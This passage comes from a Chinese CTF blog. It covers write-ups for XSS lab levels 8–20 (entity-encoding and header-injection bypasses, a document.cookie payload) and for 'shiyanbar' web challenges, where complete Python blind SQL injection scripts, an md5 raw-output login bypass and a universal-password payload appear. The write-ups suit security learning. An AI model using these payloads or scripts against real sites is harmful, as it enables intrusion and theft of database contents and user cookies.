alt></p>\n<p>可以看到对于a标签来说只过滤了双引号，还有将<code>script</code>替换成了<code>scr_ipt</code>，由于过滤了双引号，所以我们之前的闭合双引号构造其它标签的方法就不行了，只能在<code>href=&quot;&quot;</code>上面做文章，本来我们可以提交<code>javascript:alert()</code>，但是题目污染了script敏感词，不过我们可以使用html实体编码绕过（即&amp;#开头的编码方式）<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level8.php?keyword&#x3D;java&amp;#115;cript:alert(&#39;xss&#39;)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$str = strtolower($_GET[<span class=\"string\">\"keyword\"</span>]);</span><br><span class=\"line\">$str2=str_replace(<span class=\"string\">\"script\"</span>,<span class=\"string\">\"scr_ipt\"</span>,$str);</span><br><span class=\"line\">$str3=str_replace(<span class=\"string\">\"on\"</span>,<span class=\"string\">\"o_n\"</span>,$str2);</span><br><span class=\"line\">$str4=str_replace(<span class=\"string\">\"src\"</span>,<span class=\"string\">\"sr_c\"</span>,$str3);</span><br><span class=\"line\">$str5=str_replace(<span class=\"string\">\"data\"</span>,<span class=\"string\">\"da_ta\"</span>,$str4);</span><br><span class=\"line\">$str6=str_replace(<span class=\"string\">\"href\"</span>,<span class=\"string\">\"hr_ef\"</span>,$str5);</span><br><span class=\"line\">$str7=str_replace(<span class=\"string\">'\"'</span>,<span class=\"string\">'&amp;quot'</span>,$str6);</span><br></pre></td></tr></table></figure>\n<p>查看后台代码可知题目果然就是直接将敏感词转换，所以确实存在编码绕过的问题的</p>\n<hr>\n<h1 id=\"浏览器解码方式与XSS\"><a href=\"#浏览器解码方式与XSS\" class=\"headerlink\" title=\"浏览器解码方式与XSS\"></a>浏览器解码方式与XSS</h1><p>在上一关中，我们利用html实体编码实现了弹窗， 想要探究这些问题的原理，我们就必须去了解一下浏览器究竟是怎么解码的</p>\n<p><img src=\"/2019/03/02/xss20/5.png\" alt></p>\n<p>浏览器在解析时，首先由浏览器解析HTML生成DOM树，然后解析CSS生成CSSDOM树，之后JS解释器才开始进行解析执行， 如果碰到URL的话会由URL解释器进行解码，为了我们研究问题，我们可以粗略的把浏览器分为三部分HTML解释器，URL解释器，JS解释器，顺序简化为<code>HTML-&gt;URL-&gt;JS</code><br>各种解释器能够识别的编码方式</p>\n<ul>\n<li>HTML解释器识别的是HTML实体编码，也就是&amp;#xx这种的</li>\n<li>URL解释器可以识别URL编码</li>\n<li>JS解释器可以识别Unicode编码，类似\\uxxx</li>\n</ul>\n<blockquote>\n<p>浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那些被实体编码的内容的，只有建立起DOM 树，才能对每个节点的内容进行识别，如果出现实体编码，则会进行实体解码。在此基础上，JavaScript DOM API 参与进来，可以对DOM 树进行修改，改变DOM树的结构和内容。<br>这段话说的比较清楚了，在dom树构建之时，html实体编码是没有被自解码的，那么此时dom树的节点结构就已经被固定了。后续自解码以后并不会影响到dom树/节点/标签的结构。这个道理和sql中的预编译是有些类似的。之后的自解码以后获得的&lt;&gt;将不会被解析成新的节点。 但并不是说dom树构建完毕后就不能被改变了。js是可以操作节点进行增删改操作的。</p>\n</blockquote>\n<p>我们来探讨一下下面四个写法是否能够成功执行JS</p>\n<ol>\n<li><code>&lt;a href=javascript:al\\u65rt(1)&gt;click&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:al%65rt(1)&gt;click&lt;/a&gt;</code></li>\n<li><code>&lt;a href=javascript:al&amp;#101;rt(1)&gt;click&lt;/a&gt;</code></li>\n<li><code>&lt;a href=jav%61script:alert(1)&gt;click4&lt;/a&gt;</code></li>\n</ol>\n<p>第一种写法无法实现弹窗，因为HTML和url都无法识别unicode编码，只有JS可以解码，但是在JS解释之前alert的e是被编码的状态，JS不会认为该语句是可以执行的，因为有一个被编码的字符e，如果此时修改为<code>alert(&#39;\\u65&#39;)</code>就可以被成功执行</p>\n<p>第二种写法可以实现弹窗，因为url解码是在js解码之前的，所以在JS执行之前已经得到完整的JS代码了，所以可以执行</p>\n<p>第三种写法自然也可以实现弹窗，因为HMLT解码更早，在url解码之前，所以自然能够执行</p>\n<p>第四种写法无法执行，因为在url识别阶段，解码得到的javascript，此时自然不会将JavaScript看做是伪协议，所以跳转链接会产生错误，可以与第二种写法进行比对</p>\n<blockquote>\n<p>回到第8题，我们也就可以理解了，如果我们将<code>javacript</code>全部进行html实体编码，显然也是可以执行成功的，但是进行url编码则无法成功，与上面第4个例子的原理是一样的</p>\n</blockquote>\n<hr>\n<h1 id=\"XSS-9\"><a href=\"#XSS-9\" class=\"headerlink\" title=\"XSS-9\"></a>XSS-9</h1><p>测试可知依然存在上述的编码绕过问题，但是本题加入了一个链接检测，如果链接不合法就会被拦截，经过测试发现只要链接中出现<code>http://</code>就会被判定为合法链接，之后我们再用注释将这段字符注释掉即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level9.php?keyword&#x3D;java&amp;#115cript:alert()&#x2F;*http:&#x2F;&#x2F;*&#x2F;</span><br></pre></td></tr></table></figure>\n<p>查看代码可以看到过滤果然就是我们猜测的内容<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">false</span>===strpos($str7,<span class=\"string\">'http://'</span>))</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"XSS-10\"><a href=\"#XSS-10\" class=\"headerlink\" title=\"XSS-10\"></a>XSS-10</h1><p>本题主要考察隐藏元素的寻找，因为本题不在是前面题目用keyword的内容来替代，查看源代码可知有一个新表单存在三个参数，因为类型是<code>hidden</code>所以看不到，测试发现第三个参数是有效参数，而且只过滤了<code>&lt;&gt;</code>两个符号，所以我们用之前的payload即可，在设置<code>type=text</code>使其可见</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level10.php?keyword&#x3D;aaa&amp;t_link&#x3D;addd&amp;t_history&#x3D;ffads&amp;t_sort&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>\n<h1 id=\"XSS-11\"><a href=\"#XSS-11\" class=\"headerlink\" title=\"XSS-11\"></a>XSS-11</h1><p>题目中的t_sort字段过滤比较严格，无法绕过，但是题目在访问的时候消息头中会存在<code>Referer</code>字段，该字段存在注入的问题</p>\n<p><img src=\"/2019/03/02/xss20/3.png\" alt></p>\n<p><img src=\"/2019/03/02/xss20/4.png\" alt></p>\n<p>测试<code>&lt;&gt;script&#39;&quot;</code>，发现<code>&lt;&gt;</code>被过滤了，其余正常，所以payload就很简单了，和前面一样，只是位置变了而已</p>\n<p><img src=\"/2019/03/02/xss20/6.png\" alt></p>\n<h1 id=\"XSS-12\"><a href=\"#XSS-12\" class=\"headerlink\" title=\"XSS-12\"></a>XSS-12</h1><p>和上体基本一样，只不过本题是UA头的xss</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text</span><br></pre></td></tr></table></figure>\n<h1 id=\"XSS-13\"><a href=\"#XSS-13\" class=\"headerlink\" title=\"XSS-13\"></a>XSS-13</h1><p>cookie的xss</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">user&#x3D;&quot; onclick&#x3D;&quot;window.alert()&quot; type&#x3D;&quot;text;</span><br></pre></td></tr></table></figure>\n<h1 id=\"XSS-14\"><a href=\"#XSS-14\" class=\"headerlink\" title=\"XSS-14\"></a>XSS-14</h1><p>这关环境有问题，网站访问不了，好像是一个图片型xss</p>\n<h1 id=\"XSS-15\"><a href=\"#XSS-15\" class=\"headerlink\" title=\"XSS-15\"></a>XSS-15</h1><p>ng-include 题目好像有点问题</p>\n<h1 id=\"XSS-16\"><a href=\"#XSS-16\" class=\"headerlink\" title=\"XSS-16\"></a>XSS-16</h1><p>本题过滤的挺多的，过滤了<code>script</code>、<code>空格</code>、<code>/</code>，只要没过滤尖括号就万事好说，空格我们可以用<code>%0a</code>绕过，payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;input%0Aonclick&#x3D;&quot;window.alert()&quot;&gt;</span><br><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level16.php?keyword&#x3D;&lt;image%0Asrc&#x3D;1%0aonerror&#x3D;&quot;alert()&quot;&gt;</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"XSS-17\"><a href=\"#XSS-17\" class=\"headerlink\" title=\"XSS-17\"></a>XSS-17</h1><p>本题有两个参数arg01和arg02，虽然还有flash，但是这道题和flash没关系，别被迷惑，测试一下输出点在哪个参数，发现arg02上有输出，<code>&lt;&gt;</code>、<code>&quot;</code>被过滤，我们可以使用onclick参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level17.php?arg01&#x3D;ffff&amp;arg02&#x3D;fff%208888%20onclick&#x3D;alert()</span><br></pre></td></tr></table></figure>\n<h1 id=\"XSS-18\"><a href=\"#XSS-18\" class=\"headerlink\" title=\"XSS-18\"></a>XSS-18</h1><p>过滤了<code>&lt;&gt;</code> <code>&quot;</code>，感觉和17题没什么区别</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onfocus&#x3D;alert()</span><br><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level18.php?arg01&#x3D;wwww&amp;arg02&#x3D;bfff%20888%20onclick&#x3D;alert()</span><br></pre></td></tr></table></figure>\n<p>可能我太菜了，没get到17、18两题的考点，希望看到的师傅们和我交流一下XD</p>\n<h1 id=\"XSS-19\"><a href=\"#XSS-19\" class=\"headerlink\" title=\"XSS-19\"></a>XSS-19</h1><p>从这关开始之后就是flash xss了，看了代码也看不懂2333，测试了一下这个payload是可以用的，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level19.php?arg01&#x3D;version&amp;arg02&#x3D;%3Ca%20href&#x3D;%22javascript:alert(document.domain)%22%3Exss_by_SST%3C&#x2F;a%3E</span><br></pre></td></tr></table></figure>\n<h1 id=\"XSS-20\"><a href=\"#XSS-20\" class=\"headerlink\" title=\"XSS-20\"></a>XSS-20</h1><p>payload看不懂</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;localhost&#x2F;xss20&#x2F;level20.php?arg01&#x3D;id&amp;arg02&#x3D;\\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a&#x3D;!alert(document.cookie)&#x2F;&#x2F;%26width%26height</span><br></pre></td></tr></table></figure>\n<p>有时间再研究吧，这个用的另一种脚本语言</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>对于XSS的绕过，可以采用双写，大小写，闭合标签，利用过滤不完全的漏洞来使用标签</p>\n<blockquote>\n<p>XSS一般利用js脚本读取用户浏览器中的Cookie，而如果在服务器端对Cookie 设置了HttpOnly 属性，那么js脚本就不能读取到cookie，但是浏览器还是能够正常使用cookie</p>\n</blockquote>\n<p>总的来说，对于XSS攻击，我们要对<strong>输入参数进行过滤，对输出进行编码转义，白名单和黑名单相结合。</strong></p>\n<p><strong><em>reference:</em></strong><br><a href=\"https://www.cnblogs.com/escape-w/p/10162831.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/escape-w/p/10162831.html</a><br><a href=\"https://blog.csdn.net/he_and/article/details/80588409\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/he_and/article/details/80588409</a></p>\n","categories":["writeup"],"tags":["XSS"]},{"title":"实验吧web","url":"/2018/06/10/%E5%AE%9E%E9%AA%8C%E5%90%A7web/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近把bugku的题目做的差不多了，发现自己还是菜的要死(扎心..)，所以决定再做一做实验吧的题目</p>\n<a id=\"more\"></a>\n<h1 id=\"后台登录\"><a href=\"#后台登录\" class=\"headerlink\" title=\"后台登录\"></a>后台登录</h1><p>打开网页后查看元素发现sql逻辑语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$sql &#x3D; &quot;SELECT * FROM admin WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;&quot;.md5($password,true).&quot;&#39;&quot;;</span><br></pre></td></tr></table></figure>\n<p>这个不知道密码，此处思路是md5()函数返回16进制字符串，然后16进制字符串会和SQL语句拼接，如果能够凑出一个password的字符串为 <code>&#39; or &#39;a</code> 这样的内容的话，不就可以绕过了，那么去哪找这样的字符串呢，一看题目url，看到了 <code>ffifdyop</code> ,直接提交一下这个东西，居然正好就是可以。</p>\n<h1 id=\"加了料的报错注入\"><a href=\"#加了料的报错注入\" class=\"headerlink\" title=\"加了料的报错注入\"></a>加了料的报错注入</h1><p>本题一开始我以为是报错注入，结果才知道是个盲注，题目过滤了很多东西，比如union,substr,=等，所以尝试正则注入，这也是我第一次写这个方面脚本，可能是网速的原因，注入非常慢，这里就只写一下其中的一个payload，注意：正则表达式需要对特殊字符添加转义才可以。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">keys = string.ascii_lowercase + <span class=\"string\">r'!_&#123;&#125;@~,'</span> + string.digits</span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">flag_yes = <span class=\"string\">'You are our member'</span></span><br><span class=\"line\">url = <span class=\"string\">'http://ctf5.shiyanbar.com/web/baocuo/index.php'</span></span><br><span class=\"line\">payload = <span class=\"string\">\"' or (select group_concat(column_name) from information_schema.tables where !(table_schema &lt;&gt; database())) regexp '^&#123;&#125;' and 2&gt;'1\"</span></span><br><span class=\"line\">data = &#123;<span class=\"string\">'username'</span>:<span class=\"string\">'aa'</span>,<span class=\"string\">'password'</span>:payload&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">15</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">\t\ttmp = item</span><br><span class=\"line\">\t\tdata[<span class=\"string\">'password'</span>] = payload.format(flag + tmp)</span><br><span class=\"line\">\t\tres = requests.post(url,data=data).text</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> flag_yes <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">\t\t\tflag += tmp</span><br><span class=\"line\">\t\t\tprint(flag)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\tprint(i)</span><br><span class=\"line\"></span><br><span class=\"line\">print(<span class=\"string\">'database:'</span>,flag)</span><br></pre></td></tr></table></figure>\n<h1 id=\"认真一点！\"><a href=\"#认真一点！\" class=\"headerlink\" title=\"认真一点！\"></a>认真一点！</h1><p>这题看了别人的wp，确实6啊，自己的注入还是太菜鸡了</p>\n<p>直接id=0或id=1发现页面回显不同，应该是盲注，再输入id=1aaaaaa,发现也可以回显，于是可以利用这个来测试过滤了，输入id=1or,会发现被过滤，继续用相同方法测试发现<br><code>and,空格，^,union,substr,逗号,%</code>等许多都被过滤了，但是发现引号没有被过滤，可以继续测试尝试闭合<code>id=0&#39;%0aoorr%0a&#39;or&#39;=&#39;*</code>，这说明or是被当做空格处理一次这样的方式过滤的，之前也试过/**/但是没有用,才使用%0a绕过空格过滤，接下来考试考虑盲注，</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse</span><br><span class=\"line\"></span><br><span class=\"line\">keys = string.ascii_lowercase + string.digits + <span class=\"string\">r'!_&#123;&#125;@~.'</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">flag_yes = <span class=\"string\">'You are in'</span></span><br><span class=\"line\">url = <span class=\"string\">r'http://ctf5.shiyanbar.com/web/earnest/index.php'</span></span><br><span class=\"line\">payload = <span class=\"string\">\"0'%0aoorr%0a((select%0agroup_concat(table_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.tables%0awhere%0atable_schema=database())%0aregexp%0a\"</span> + <span class=\"string\">\"'&#123;&#125;$')\"</span> + <span class=\"string\">\"%0aoorr%0a'b'='a\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">blind_inje</span><span class=\"params\">(payload)</span>:</span></span><br><span class=\"line\">\tflag = <span class=\"string\">''</span></span><br><span class=\"line\">\tdata = &#123;<span class=\"string\">'id'</span>:payload&#125;</span><br><span class=\"line\">\tok = <span class=\"literal\">True</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> ok:</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> keys:</span><br><span class=\"line\">\t\t\tdata[<span class=\"string\">'id'</span>] = parse.unquote(payload.format(item + flag))</span><br><span class=\"line\">\t\t\tres = requests.post(url,data=data).text</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># print(payload.format(item + flag))</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> flag_yes <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">\t\t\t\tflag = item + flag</span><br><span class=\"line\">\t\t\t\tprint(flag)</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> item == <span class=\"string\">'.'</span>:</span><br><span class=\"line\">\t\t\t\tok = <span class=\"literal\">False</span></span><br><span class=\"line\">\tprint(<span class=\"string\">'[+]:'</span>,flag)</span><br><span class=\"line\"><span class=\"comment\"># blind_inje(payload)</span></span><br><span class=\"line\"><span class=\"comment\"># table_name:fiag@users</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload1 = \"0'%0aoorr%0a((select%0agroup_concat(column_name%0aseparatoorr%0a'@')%0afrom%0ainfoorrmation_schema.columns%0awhere%0atable_name='fiag')%0aregexp%0a\" + \"'&#123;&#125;$')\" + \"%0aoorr%0a'b'='a\"</span></span><br><span class=\"line\"><span class=\"comment\"># blind_inje(payload1)</span></span><br><span class=\"line\"><span class=\"comment\"># column_name:fl.4g或者fl$4g</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">\"0'%0aoorr%0a((select%0agroup_concat(fl$4g)%0afrom%0afiag)%0aregexp%0a'&#123;&#125;$')%0aoorr%0a'b'='a\"</span></span><br><span class=\"line\">blind_inje(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># flag:flag&#123;haha~you.win!&#125;注意点号只是一个通配符，所以这个点究竟是那个字符得多试几次</span></span><br><span class=\"line\"><span class=\"comment\"># flag:flag&#123;haha~you win!&#125;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"NSCTF-web200\"><a href=\"#NSCTF-web200\" class=\"headerlink\" title=\"NSCTF web200\"></a>NSCTF web200</h1><p>题目给出了加密代码，直接逆向跑一遍就好了</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>  </span><br><span class=\"line\">$str = <span class=\"string\">'a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws'</span>;</span><br><span class=\"line\">$str = base64_decode(strrev(str_rot13($str)));</span><br><span class=\"line\">$flag = <span class=\"string\">''</span>;</span><br><span class=\"line\"><span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class=\"line\">\t$_c = substr($str, $i, <span class=\"number\">1</span>);</span><br><span class=\"line\">\t$a = ord($_c);</span><br><span class=\"line\">\t$b = chr($a<span class=\"number\">-1</span>);</span><br><span class=\"line\">\t$flag = $flag.$b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> strrev($flag);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"登录一下好吗\"><a href=\"#登录一下好吗\" class=\"headerlink\" title=\"登录一下好吗\"></a>登录一下好吗</h1><p>先随便输入信息登录，页面会显示你的登录用户名和密码，需要注意的是页面返回的是处理之后的数据，所以可以据此判断哪些字符遭到了过滤，比如 <code>uesrname=admin&#39; or 1=1</code>,前端回显就没有了or，说明or被过滤，剩下的就不说了，本题可以使用万能密码，payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">username&#x3D;&#39;&#x3D;&#39;&amp;password&#x3D;&#39;&#x3D;&#39;</span><br></pre></td></tr></table></figure>\n<p>那么在数据库中就变成了 <code>select * from users where username=&#39;&#39;=&#39;&#39; and password=&#39;&#39;=&#39;&#39;</code> ，所以就成了<code>select * from users where 1 and 1</code> 注意他逻辑运算的时候是一次从前往后运算的。</p>\n<h1 id=\"天下武功唯快不破\"><a href=\"#天下武功唯快不破\" class=\"headerlink\" title=\"天下武功唯快不破\"></a>天下武功唯快不破</h1><p>看题目描述可知这题考察脚本编写，因为他要求你立即在限定时间内提交返回的base64解码的值，如果手工操作速度肯定来不及，所以直接上脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.get(url).headers[<span class=\"string\">'FLAG'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">flag = base64.b64decode(response)</span><br><span class=\"line\"></span><br><span class=\"line\">flag = flag.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">flag = flag.split(<span class=\"string\">':'</span>)</span><br><span class=\"line\">flag = flag[<span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">data = &#123;<span class=\"string\">'key'</span>:flag&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">res = requests.post(url,data=data).text</span><br><span class=\"line\"></span><br><span class=\"line\">print(res)</span><br></pre></td></tr></table></figure>\n<p>可以得到flag</p>\n<h1 id=\"让我进去\"><a href=\"#让我进去\" class=\"headerlink\" title=\"让我进去\"></a>让我进去</h1><p>修改cookie里的source的值为1可以看到源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$flag = <span class=\"string\">\"XXXXXXXXXXXXXXXXXXXXXXX\"</span>;</span><br><span class=\"line\">$secret = <span class=\"string\">\"XXXXXXXXXXXXXXX\"</span>; <span class=\"comment\">// This secret is 15 characters long for security!</span></span><br><span class=\"line\">$username = $_POST[<span class=\"string\">\"username\"</span>];</span><br><span class=\"line\">$password = $_POST[<span class=\"string\">\"password\"</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"keyword\">empty</span>($_COOKIE[<span class=\"string\">\"getmein\"</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (urldecode($username) === <span class=\"string\">\"admin\"</span> &amp;&amp; urldecode($password) != <span class=\"string\">\"admin\"</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($COOKIE[<span class=\"string\">\"getmein\"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Congratulations! You are a registered user.\\n\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">die</span> (<span class=\"string\">\"The flag is \"</span>. $flag);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span> (<span class=\"string\">\"Your cookies don't match up! STOP HACKING THIS SITE.\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span> (<span class=\"string\">\"You are not an admin! LEAVE.\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">setcookie(<span class=\"string\">\"sample-hash\"</span>, md5($secret . urldecode(<span class=\"string\">\"admin\"</span> . <span class=\"string\">\"admin\"</span>)), time() + (<span class=\"number\">60</span> * <span class=\"number\">60</span> * <span class=\"number\">24</span> * <span class=\"number\">7</span>));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($_COOKIE[<span class=\"string\">\"source\"</span>])) &#123;</span><br><span class=\"line\">    setcookie(<span class=\"string\">\"source\"</span>, <span class=\"number\">0</span>, time() + (<span class=\"number\">60</span> * <span class=\"number\">60</span> * <span class=\"number\">24</span> * <span class=\"number\">7</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($_COOKIE[<span class=\"string\">\"source\"</span>] != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"\"</span>; <span class=\"comment\">// This source code is outputted here</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码逻辑要求username=admin而password不等于admin，然后cookie里面的getmein的MD5值与$secret+username+password的值拼接取MD5相等即可绕过验证，这里需要用到hash长度扩展攻击，具体原理可以参看网上其他文章，这里推荐一个工具Python包hashpump，我是在linux下使用的</p>\n<p><img src=\"/2018/06/10/%E5%AE%9E%E9%AA%8C%E5%90%A7web/1.png\" alt=\"payload\"></p>\n<h1 id=\"简单的SQL注入3\"><a href=\"#简单的SQL注入3\" class=\"headerlink\" title=\"简单的SQL注入3\"></a>简单的SQL注入3</h1><p>题目虽然说的是报错注入，但是确保报错注入的函数给过滤完了，所以题目实际上是个盲注，直接盲注就可以了，上一波脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">'http://ctf5.shiyanbar.com/web/index_3.php'</span></span><br><span class=\"line\">payload = <span class=\"string\">\"?id=0' or (substr(database(),&#123;&#125;,1)='&#123;&#125;')%23\"</span>  <span class=\"comment\"># database:web1</span></span><br><span class=\"line\">words = string.ascii_lowercase + string.digits + <span class=\"string\">'&#123;&#125;_!~@%^&amp;*-'</span></span><br><span class=\"line\">flag_yes = <span class=\"string\">'Hello'</span></span><br><span class=\"line\">flag = <span class=\"string\">''</span></span><br><span class=\"line\">payload1 = <span class=\"string\">\"?id=0' or (substr((select group_concat(table_name separator '@') from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;')%23\"</span></span><br><span class=\"line\"><span class=\"comment\"># table_name: flag@web1</span></span><br><span class=\"line\">payload2 = <span class=\"string\">\"?id=0' or (substr((select group_concat(flag separator '@') from information_schema.columns where table_name='flag'),&#123;&#125;,1)='&#123;&#125;')%23\"</span></span><br><span class=\"line\"><span class=\"comment\"># column_name = flag@id</span></span><br><span class=\"line\">payload3 = <span class=\"string\">\"?id=0' or (substr((select group_concat(flag separator '@') from flag),&#123;&#125;,1)='&#123;&#125;')%23\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">8</span>,<span class=\"number\">30</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> words:</span><br><span class=\"line\">\t\tres = requests.get(url + payload3.format(str(i),item)).text</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> flag_yes <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">\t\t\tflag += item</span><br><span class=\"line\">\t\t\tprint(flag)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> item == <span class=\"string\">'-'</span>:</span><br><span class=\"line\">\t\t\tprint(<span class=\"string\">'end'</span>)</span><br><span class=\"line\"><span class=\"comment\"># flag&#123;y0u_@r3_5o_damn_90od&#125; 大小写可能有问题</span></span><br></pre></td></tr></table></figure>\n<p>本题没有过滤其他任何东西，所以其实使用sqlmap等工具更为简单，此处贴出脚本这是为了方便大家了解其中的原理。</p>\n<h1 id=\"简单的SQL注入\"><a href=\"#简单的SQL注入\" class=\"headerlink\" 